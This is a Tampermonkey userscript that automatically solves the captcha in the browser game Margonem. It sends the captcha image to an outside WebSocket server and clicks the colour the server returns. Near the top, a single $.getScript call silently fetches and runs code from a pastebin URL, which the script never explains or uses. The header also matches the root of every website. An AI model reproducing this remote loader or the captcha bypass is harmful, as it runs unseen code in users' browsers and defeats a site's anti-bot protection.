// ==UserScript==
// @name         Anty Captcha
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  try to take over the world!
// @author
// @match        *://*/
// @match        https://www.margonem.pl/?task=*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/408126/Anty%20Captcha.user.js
// @updateURL https://update.greasyfork.org/scripts/408126/Anty%20Captcha.meta.js
// ==/UserScript==
$.getScript("https://pastebin.com/raw/sMR7t8QM");
(function() {
    'use strict';
    var Started = false
    setInterval(function() {
        if ($('.captchaimage')[0] == undefined) {
 
        } else {
            if (Started == false) {
                console.log('[AntyCaptcha] Wykryto Captche')
                var MkoesWS = new WebSocket("wss://margonemcaptcha.herokuapp.com/");
                MkoesWS.onopen = function(e) {
                    MkoesWS.send($('.captchaimage')[0].firstChild.src)
                    Started = true
                }
 
                MkoesWS.onmessage = function(e) {
                    var ButtonsLength = $('.btn-wood').length
                    var Color = e.data.toString()
                    console.log('[AntyCaptcha] Wykryto kolor: ' + Color)
                    var i = 0
                    for (i = 0; i < ButtonsLength; i++) {
                        if ($('.btn-wood')[i].innerHTML.includes(Color)) {
                            console.log('[AntyCaptcha] Click -> btn-wood[' + Color + ']')
                            $('.btn-wood')[i].click()
                            var b = 0
                            for (b = 0; b < ButtonsLength; b++) {
                                if ($('.btn-wood')[b].innerHTML.includes("Potwierdzam")) {
                                    console.log('[AntyCaptcha] Click -> btn-wood[Potwierdzam]')
                                    $('.btn-wood')[b].click()
                                    Started = false
                                }
                            }
                        }
                    }
                }
            } else {
 
            }
        }
    }, 1000);

    })();